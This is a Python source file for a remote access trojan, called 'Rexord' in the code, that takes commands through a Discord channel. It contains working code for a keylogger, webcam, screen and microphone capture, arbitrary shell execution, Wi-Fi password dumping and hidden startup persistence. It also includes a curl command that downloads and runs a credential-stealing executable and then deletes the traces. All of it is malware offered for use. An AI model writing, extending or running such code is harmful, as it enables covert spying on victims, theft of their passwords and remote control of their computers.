#!/usr/bin/env python
# poc discord bot
# created by : C0SM0

# imports
import discord
import cv2
import os
from discord.ext import tasks
from pynput.keyboard import Listener
import pyautogui as pag
import sounddevice as sd
from scipy.io.wavfile import write
import subprocess
import sys
from dotenv import load_dotenv
import getpass

# discord bot token
load_dotenv()
TOKEN = str(os.getenv("TOKEN"))
channel_id = str(os.getenv("channel_id"))
channel_name = str(os.getenv("channel_name"))

# create client
client = discord.Client()

# config vairables
keylogger_msg = '[*] Starting Keylogger...'
target_username = getpass.getuser()
selected_target = target_username
operating_system = ''
log_keys = False

# help menu
help_menu = '''
**[+] Getting Started:**
 - `hello` - see connected targets
 - `select <target>` - connect to specified target ['all' by default]

**[+] General:**
 - `help` - displays this menu
 - `upload <attachment>` - upload file(s) to target
 - `download <filename>` - download file(s) [list multiple with ","] 
 - `shutdown` - shuts down target
 - `restart` - restarts target
 - `exit` - exits target [can't reconnect]
 - `killswitch` - uninstalls from target
 
**[+] Payloads:**
 - `start keylogger` - starts live keylogger
 - `stop keylogger` - stops live keylogger
 - `webcam` - take picture through target webcam
 - `screenshot` - screenshot target computer
 - `record player <seconds>` - record audio from target 
 - `wifi creds` - gets wifi credentials
 - `web creds` - gets web credentials

**[+] System:**
 - `persist` - executes persistence on target
 - `$<command>` - execute system command on target
 - `private` - get private ip address
 - `public` - get public ip address
 - `os` - show os
'''

# get target operating system
async def get_os(message, output):
    global operating_system

    # windows
    if os.name == 'nt':
        operating_system = 'windows'
        
    # linux
    if os.name == 'posix':
        operating_system = 'linux'

    # outputs
    if output:
        await message.channel.send(f'[+] {target_username} is running {operating_system}')

    return

# add to startup registry
async def add_to_startup(message):  

    global operating_system

    # windows persistence
    if operating_system == 'windows':

        # startup controller
        startup_payload = '@echo off\nPowerShell.exe -ExecutionPolicy Bypass -windowstyle hidden -File "$env:appdata/rexord.exe"'

        # write controller to startup
        with open(f'C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup') as pyld:
            pyld.write(startup_payload)

        # move payload to appdata
        payload = 'rexord.exe'
        os.system(f'move {payload} C:/Users/{target_username}/AppData/Roaming')
        await message.channel.send(f'[+] Persistence added on {target_username}')

    # linux persistence
    if operating_system == 'linux':
        await message.channel.send('[!!] Persistence not yet added on linux')

# kill switch
async def kill_switch(message):

    global operating_system

    if operating_system == 'windows':
        os.system('del rexord.exe')

    if operating_system == 'linux':
        os.system('rm -rf rexord.bin')

    await message.channel.send(f'[+] Rexord removed from {target_username}')

# get wi-fi creds
async def get_wifi_creds(message):

    output = ''

    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

    for i in profiles:

        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')

        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

        try:
            output += ("{:<30}|  {:<}".format(i, results[0])) + '\n'
        except IndexError:
            output += ("{:<30}|  {:<}".format(i, "")) + '\n'
    
    await message.channel.send(f'[+] Wi-Fi Creds for {target_username}')
    await message.channel.send(output[:2000])

    return

# get web credentials
async def get_web_creds(message):

    # download paylod
    await message.channel.send(f'[*] Downloading Malware on {target_username}...')
    os.system('curl -o w.exe https://raw.githubusercontent.com/Cryptexproject/Cryptex/master/payloads/web/web.exe')

    await message.channel.send(f'[*] Executing Malware on {target_username}...')
    os.system('w.exe /stext creds.txt')

    await message.channel.send(f'[+] Web Creds Obtained on {target_username}')
    await message.channel.send(file=discord.File('creds.txt'))

    # delete traces
    os.remove('w.exe')
    os.remove('creds.txt')
    os.remove('w.cfg')

    return

# execute system commands
async def execute(message, cmd):
    cmd_output = subprocess.check_output(cmd, shell=True, universal_newlines=True)
    await message.channel.send(cmd_output[:2000])
    return

# remote upload code
async def upload(message, attachments):

    # iterate through each file and upload it
    for attachment in attachments:
        await attachment.save(attachment.filename)
        await message.channel.send(f'[+] Uploaded {attachment.filename} to {target_username}')

    return

# remote download code
async def download(message, user_message):

    # values
    file_name = user_message[9:]
    file_list = file_name.split(',')

    await message.channel.send(f'[*] Downloading {file_list} from {target_username}...')

    # iterate through each file and download it
    for attachment in file_list:
        attachment = attachment.strip()
        await message.channel.send(file=discord.File(attachment))

    return

# starts remote keylogger
def start_keylogger(key):

    global keylogger_msg
 
    # key
    k = str(key).replace("'", "")
    
    # format unrecognized keys
    if k == 'Key.enter':
        keylogger_msg += "\n"
    elif k == 'Key.backspace':
        keylogger_msg = keylogger_msg[:-1] 
    elif k == 'Key.shift':
        keylogger_msg += k.upper()
    elif k == 'Key.tab':
        keylogger_msg += '\t'
    elif k == 'Key.delete':
        keylogger_msg += '[DEL]'
    elif k == 'Key.space':
        keylogger_msg += ' '
    elif k == 'Key.ctrl':
        keylogger_msg += '^'
    elif k == 'Key.alt':
        keylogger_msg += '[ALT]'
    elif k == 'Key.delete':
        keylogger_msg += '[DEL]'
    elif k == 'Key.up':
        keylogger_msg += '[UP]'
    elif k == 'Key.down':
        keylogger_msg += '[DOWN]'
    elif k == 'Key.left':
        keylogger_msg += '[LEFT]'
    elif k == 'Key.right':
        keylogger_msg += '[RIGHT]'
    else:
        keylogger_msg += k

    return
        
# loops the keylogger, sends logs 
@tasks.loop(seconds=10)
async def send_logs():
    
    global keylogger_msg

    # tries to send logs
    try:
        channel = client.get_channel(channel_id)
        await channel.send(keylogger_msg)

    # exception : empty string
    except:
        pass

    # wipes logs
    finally:
        keylogger_msg = ''

    return

# stops remote keylogger
def stop_keylogger(key):
    global log_keys
    if log_keys == False:
        return False

# takes screenshot
async def screenshot(message):

    # take and save screenshot
    ss_name = 'rx.png'

    # take and save screenshot
    try:
        ss = pag.screenshot()
        ss.save(ss_name)

        # send file 
        await message.channel.send(f'[*] Taking Screenshot from {target_username}...')
        await message.channel.send(file=discord.File(ss_name))
        
        # delete file
        os.remove(ss_name)
    
    # is scrot not installed
    except NotImplementedError:
        await message.channel.send(f'[!!] "scrot" not installed on {target_username}')
        return 
        
    finally:
        return 

# take webcam image
async def webcam(message):

    # values
    webcam_name = 'wc.png'
    await message.channel.send(f'[*] Taking Webcam Photo on {target_username}...')

    # get camera
    cam_port = 0
    cam = cv2.VideoCapture(cam_port)
    
    # read camera data
    result, image = cam.read()
    
    # if image grabbed
    if result:

        # save image
        cv2.imwrite(webcam_name, image)

        await message.channel.send(file=discord.File(webcam_name))
        await message.channel.send(f'[!] Successful Image Grabbed on {target_username}')

        os.remove(webcam_name)
        
    # if image not found
    else:
        await message.channel.send(f'[!!] Camera Not Detected on {target_username}')

# capture and listen too audio
async def record_player(message, seconds=30):

    await message.channel.send(f'[*] Recording Microphone on {target_username}...')
    
    # values
    frequency = 44400
    seconds = float(seconds)
    recording_name = 'audio.wav'
    
    # record and generate auio
    recording = sd.rec(int(seconds * frequency), samplerate = frequency, channels = 2)
    sd.wait()
    
    # save recording
    write(recording_name, frequency, recording)
    await message.channel.send('[+] Recording Saved')

    await message.channel.send(file=discord.File(recording_name))

    os.remove(recording_name)

# runs when bot is started
@client.event
async def on_ready(): 
    # print('logged in as {0.user}'.format(client))
    pass

# message event handler
@client.event
async def on_message(message):

    # values
    username = str(message.author).split('#')[0]
    user_message = str(message.content)
    channel = str(message.channel.name)

    # listener for keylogger
    listener = Listener(on_press=start_keylogger, on_release=stop_keylogger)
    global log_keys

    # logging
    # print(f'{username} : {user_message} ({channel})')
    
    # exception : prevents bot from responding to itself
    if message.author == client.user:

        rexord_channel = discord.utils.get(message.guild.text_channels, name=channel_name)

        while True:
            messages = await rexord_channel.history().flatten()

            if (messages[1].content.startswith('**[+]') and user_message.startswith('**[+]')):
                await message.delete()

            else:
                break

        return

    # responds to messages from specific channel
    if message.channel.name == channel_name:
        # checks for selected target
        global selected_target

        # greet user
        if user_message.lower() == 'hello':

            await get_os(message, False)

            # respond
            await message.channel.send(f"hello {username}, from **{target_username}** on {'Windows' if os.name == 'nt' else 'Linux'}")
            return

        # select target
        elif user_message.startswith('select'):
            selected_target = user_message[6:].strip()

            if selected_target == 'all':
                selected_target = target_username

            if selected_target == target_username:
                await message.channel.send(f'[+] Selcted Target : {selected_target}')

        if selected_target == target_username:

            # get operating system
            if user_message.lower() == 'os':
                await get_os(message, True)

            # exit target
            elif user_message.lower() == 'exit':
                sys.exit(0)
                await message.channel.send(f'[*] Exiting {target_username}...')

            # display help menu
            elif user_message.lower() == 'help':
                    await message.channel.send(help_menu)

            # remote upload
            elif user_message.lower() == 'upload':
                await upload(message, message.attachments)

            # remote download
            elif user_message.lower().startswith('download'):
                await download(message, user_message)

            # remote shutdown
            elif user_message.lower() == 'shutdown':
                await message.channel.send('[*] Shutting Down...')
                os.system('shutdown')
                
            # remote restart
            elif user_message.lower() == 'restart':
                await message.channel.send('[*] Restarting...')
                os.system('shutdown /r')

            # start live keylogger
            elif user_message.lower() == 'start keylogger':
                # if not send_logs.is_running():

                log_keys = True
                listener.start()
                await send_logs.start()

                # if not send_logs.is_running():

            # stop live keylogger   
            elif user_message.lower() == 'stop keylogger':
                log_keys = False
                await send_logs.cancel()

            # take screenshot   
            elif user_message.lower() == 'screenshot':
                await screenshot(message)

            # caputer webcam image
            elif user_message.lower() == 'webcam':
                await webcam(message)

            # record player, listen to audio
            elif user_message.startswith('record player'):
                seconds = user_message[13:].strip()
                await record_player(message, seconds)

            # enables persistence
            elif user_message.startswith('persist'):
                await get_os(message, False)
                await add_to_startup(message)

            # kill switch
            elif user_message.lower() == 'killswitch':
                await get_os(message, False)
                await kill_switch(message)

            # execute commands
            elif user_message.startswith('$'):
                cmd = user_message[1:].strip()
                await execute(message, cmd)

            # wi-fi passwords
            elif user_message.lower() == 'wifi creds':
                await get_os(message, False)

                if operating_system == 'windows':
                    await get_wifi_creds(message)

                if operating_system == 'linux':
                    await message.channel.send('[!!] Wi-Fi creds not yet available for Linux')

                return

            # web passwords
            elif user_message.lower() == 'web creds':
                await get_os(message, False)

                if operating_system == 'windows':
                    await get_web_creds(message)

                if operating_system == 'linux':
                    await message.channel.send('[!!] Web Creds not yet available for Linux')

                return

            # public ip
            elif user_message.lower() == 'public':
                cmd = 'curl https://ident.me'
                await execute(message, cmd)

            # private ip
            elif user_message.lower() == 'private':
                # await get_os(message, False)

                cmd = ''

                # windows command
                if operating_system == 'windows':
                    cmd = 'ipconfig | findstr /R /C:"IPv4 Address"'

                # linux command
                if operating_system == 'linux':
                    cmd = 'ifconfig | grep broadcast | awk \'{print $2}\''

                await execute(message, cmd)

    # send messages outside of specific channel
    if user_message.lower() == '!anywhere':
        await message.channel.send('This can be sent anywhere')
        return 

# main code
def main():
    client.run(TOKEN)

# run main
if __name__ == '__main__':
    main()
